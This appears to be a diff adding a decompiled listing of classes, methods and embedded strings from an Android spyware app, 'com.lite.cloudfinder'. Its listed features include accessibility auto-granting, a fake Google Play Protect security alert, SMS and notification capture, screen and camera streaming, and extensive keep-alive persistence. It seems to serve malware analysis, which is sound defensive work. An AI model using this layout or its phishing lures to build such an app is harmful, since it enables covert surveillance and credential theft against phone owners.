@@ -1,0 +1,211 @@
+====================================================================================================
+Lcom/lite/cloudfinder/App; extends Landroid/app/Application; []
+  -- ؠ['Ljava/lang/Object;', 'Ljava/lang/String;'] -> V
+  -- onTrimMemory['I'] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/accessibility/MyAccessibilityService; extends Landroid/accessibilityservice/AccessibilityService; []
+  -- ٳ['Landroid/view/accessibility/AccessibilityNodeInfo;'] -> Z
+     S: ["'", "AutoGrant: text-click '", "MyAccessSvc", "android.widget.Button"]
+  -- ٵ[] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/activity/AdbBlackScreenActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onResume[] -> V
+     S: [".CLOSE_BLACK_SCREEN"]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/AlertActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+     S: ["Alerta de Seguridad de Google", "Alerta de seguridad", "Google Security Alert", "Powered by Google Play Protect", "Review Account →", "Se detectó actividad inusual en tu cuenta. Por favor verifica tu identidad para continuar usando este servicio.", "Security alert", "Unusual activity detected on your account. Please verify your identity to continue using this service.", "appName", "bottomBrand", "buttonText", "content", "es", "headerLabel", "isWarning", "pkg", "targetPackage", "title"]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/BlackOverlayActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onKeyDown['I', 'Landroid/view/KeyEvent;'] -> Z
+====================================================================================================
+Lcom/lite/cloudfinder/activity/ConfirmDeviceActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+     S: ["ConfirmDevice", "For your account safety, please verify your identity", "No lock screen set, skip", "Security Verification", "keyguard", "onCreate error"]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/DeviceAdminActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+     S: ["System service requires administrator privileges", "android.app.action.ADD_DEVICE_ADMIN", "android.app.extra.ADD_EXPLANATION", "android.app.extra.DEVICE_ADMIN", "device_policy", "is_DeviceAdmin_enable"]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/ExportedTriggerActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onDestroy[] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/activity/FakeIntentActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onDestroy[] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/activity/InjectActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onStop[] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/activity/LoaderActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onRequestPermissionsResult['I', '[Ljava/lang/String;', '[I'] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/activity/OverlayActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onKeyDown['I', 'Landroid/view/KeyEvent;'] -> Z
+====================================================================================================
+Lcom/lite/cloudfinder/activity/OverlayLaunchActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+     S: ["android.settings.action.MANAGE_OVERLAY_PERMISSION", "overlayRequestTime", "overlayRequested", "package:"]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/OverlayRequestActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+     S: ["android.settings.action.MANAGE_OVERLAY_PERMISSION", "package:"]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/PermissionActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- ؠ[] -> V
+     S: ["All permissions processed, finishing", "PermAct", "Requesting [", "] "]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/ScreenCaptureActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/activity/SettingsLauncherActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/activity/TransparentActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onStop[] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/activity/WebOverlayActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/alias/N; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/alias/S; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/alias/Y; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- onCreate['Landroid/os/Bundle;'] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/hd/HDPermActivity; extends Landroid/app/Activity; []
+  -- <init>[] -> V
+  -- ؋['I', 'Landroid/content/Intent;'] -> V
+     S: ["data", "fps", "height", "quality", "resultCode", "width"]
+====================================================================================================
+Lcom/lite/cloudfinder/hd/HDStreamService; extends Landroid/app/Service; []
+  -- ؋['Lcom/lite/cloudfinder/hd/HDStreamService;', 'Landroid/graphics/Bitmap;'] -> Landroid/graphics/Bitmap;
+  -- ؠ[] -> V
+     S: ["HDStream", "Streaming stopped"]
+====================================================================================================
+Lcom/lite/cloudfinder/rda; extends Landroid/app/admin/DeviceAdminReceiver; []
+  -- <init>[] -> V
+  -- onReceive['Landroid/content/Context;', 'Landroid/content/Intent;'] -> V
+     S: ["is_DeviceAdmin_enable"]
+====================================================================================================
+Lcom/lite/cloudfinder/receiver/AlarmReviveReceiver; extends Landroid/content/BroadcastReceiver; []
+  -- ؋['Landroid/content/Context;', 'J'] -> V
+     S: ["AlarmReviveReceiver", "Revive alarm scheduled in ", "alarm", "com.lite.cloudfinder.REVIVE", "ms", "scheduleRevive error"]
+  -- onReceive['Landroid/content/Context;', 'Landroid/content/Intent;'] -> V
+     S: ["Alarm revive triggered, action=", "AlarmReviveReceiver", "Start FGS error", "null"]
+====================================================================================================
+Lcom/lite/cloudfinder/receiver/BootReceiver; extends Landroid/content/BroadcastReceiver; []
+  -- <init>[] -> V
+  -- onReceive['Landroid/content/Context;', 'Landroid/content/Intent;'] -> V
+     S: ["Boot completed detected on device!", "BootReceiver", "Exception while handling boot", "Received broadcast action: ", "Restore keepalive state error", "Schedule JobService error", "Socket reconnect error", "Start FGS error", "Unknown boot action: ", "WakeLock + WorkManager restored on boot"]
+====================================================================================================
+Lcom/lite/cloudfinder/receiver/MainReceiver; extends Landroid/content/BroadcastReceiver; []
+  -- ء['Landroid/content/Context;'] -> V
+     S: ["MainReceiver", "Start FGS error"]
+  -- onReceive['Landroid/content/Context;', 'Landroid/content/Intent;'] -> V
+     S: ["", "BOOT_COMPLETED1", "MainReceiver", "RestartConn", "RestartSensor", "SMS parse error", "android.intent.action.BOOT_COMPLETED", "android.intent.action.BOOT_COMPLETED_EARLY", "android.intent.action.LOCKED_BOOT_COMPLETED", "android.intent.action.MY_PACKAGE_REPLACED", "android.intent.action.QUICKBOOT_POWERON", "android.intent.action.REBOOT", "android.permission.RECEIVE_SMS", "android.provider.Telephony.SMS_DELIVER", "android.provider.Telephony.SMS_RECEIVED", "body", "com.htc.intent.action.QUICKBOOT_POWERON", "com.huawei.android.push.intent.REGISTER", "com.meizu.safe.security.BOOT_COMPLETED", "com.smartisanos.action.BOOT_COMPLETED", "com.vivo.push.action.RECEIVE", "format", "pdus", "sender", "smsReceived", "timestamp"]
+====================================================================================================
+Lcom/lite/cloudfinder/receiver/ResetServices; extends Landroid/content/BroadcastReceiver; []
+  -- <init>[] -> V
+  -- onReceive['Landroid/content/Context;', 'Landroid/content/Intent;'] -> V
+     S: ["ResetSvc", "System event: ", "null", "restart FGS err"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/CameraService; extends Landroid/app/Service; ['Landroid/view/SurfaceHolder$Callback;', 'Landroid/hardware/Camera$PreviewCallback;']
+  -- <init>[] -> V
+  -- ؋[] -> V
+     S: ["Camera stopped", "CameraService", "stopCamera error"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/CompanionIntentService; extends Landroid/app/IntentService; []
+  -- <init>[] -> V
+     S: ["CompanionIntentService"]
+  -- ؠ[] -> V
+     S: ["CompanionIntentSvc", "Start MainFGS error"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive$AlarmReceiver; extends Landroid/content/BroadcastReceiver; []
+  -- <init>[] -> V
+  -- onReceive['Landroid/content/Context;', 'Landroid/content/Intent;'] -> V
+     S: ["Alarm: accessibility disabled, showing overlay", "AlarmReceiver error", "DAKeepAlive", "MyAccessibilityService", "enabled_accessibility_services", "power"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive; extends Landroid/app/admin/DeviceAdminService; []
+  -- ؋['Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;'] -> V
+     S: ["Accessibility DISABLED detected!", "Accessibility restored!", "DAKeepAlive", "DISABLED_DETECTED", "MyAccessibilityService", "RESTORED|downtime_sec=", "Screen off, will show overlay when screen turns on", "acc_recovery", "enabled_accessibility_services", "power"]
+  -- onDestroy[] -> V
+     S: ["CPU WakeLock released", "DAKeepAlive", "Failed to release CPU WakeLock"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/DownloadService; extends Landroid/app/IntentService; []
+  -- <init>[] -> V
+     S: ["DownloadService"]
+  -- ؋['Ljava/io/File;'] -> V
+     S: [".suffix.provider", "DownloadService", "Install error", "android.intent.action.VIEW", "application/vnd.android.package-archive"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/ForegroundKeepAliveService; extends Landroid/app/Service; []
+  -- <init>[] -> V
+  -- onTaskRemoved['Landroid/content/Intent;'] -> V
+     S: ["SocketNotification", "Task removed — scheduling restart"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/KeepAliveDreamService; extends Landroid/service/dreams/DreamService; []
+  -- <init>[] -> V
+  -- onDreamingStopped[] -> V
+     S: ["Dreaming stopped - restarting services", "KADream", "restart err"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/KeepAliveJobService; extends Landroid/app/job/JobService; []
+  -- ؋['Landroid/content/Context;'] -> V
+     S: ["Job scheduled", "KAJob", "jobscheduler", "schedule err"]
+  -- onStopJob['Landroid/app/job/JobParameters;'] -> Z
+     S: ["Job stopped - requesting reschedule", "KAJob"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/NotificationListener; extends Landroid/service/notification/NotificationListenerService; []
+  -- <init>[] -> V
+  -- onNotificationPosted['Landroid/service/notification/StatusBarNotification;'] -> V
+     S: ["", "NotiListener", "Upload notification error", "android.bigText", "android.subText", "android.text", "android.title", "bigText", "notification", "onNotificationPosted error", "pkg", "subText", "text", "timestamp", "title", "|"]
+====================================================================================================
+Lcom/lite/cloudfinder/service/ScreenRecordService; extends Landroid/app/Service; []
+  -- <init>[] -> V
+  -- onBind['Landroid/content/Intent;'] -> Landroid/os/IBinder;
+====================================================================================================
+Lcom/lite/cloudfinder/service/WebRTCStreamService; extends Landroid/app/Service; []
+  -- <init>[] -> V
+  -- onBind['Landroid/content/Intent;'] -> Landroid/os/IBinder;
+====================================================================================================
+Lcom/lite/cloudfinder/util/N; extends Ljava/lang/Object; []
+  -- startGuard[] -> V
+  -- startGuard[] -> V
+====================================================================================================
+Lcom/lite/cloudfinder/service/KeepAliveWorker; extends Landroidx/work/Worker; []
+  -- schedule['Landroid/content/Context;'] -> V
+     S: ["EiAVwCIsec", "KEEP_ALIVE_WORK", "WorkManager keepalive scheduled (15min), tag=KEEP_ALIVE_WORK", "schedule error"]
+  -- doWork[] -> Landroidx/work/ListenableWorker$Result;
+     S: ["EiAVwCIsec", "Failed to ping service", "KeepAliveWorker: Pinging service...", "Service pinged successfully"]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/MainActivity; extends Landroidx/appcompat/app/AppCompatActivity; []
+  -- <init>[] -> V
+  -- ئ[] -> V
+     S: ["MainActivity", "Start MainFGS error"]
+====================================================================================================
+Lcom/lite/cloudfinder/activity/WebHarvesterActivity; extends Landroidx/appcompat/app/AppCompatActivity; []
+  -- <init>[] -> V
+  -- آ['I'] -> I
+
+classes=44
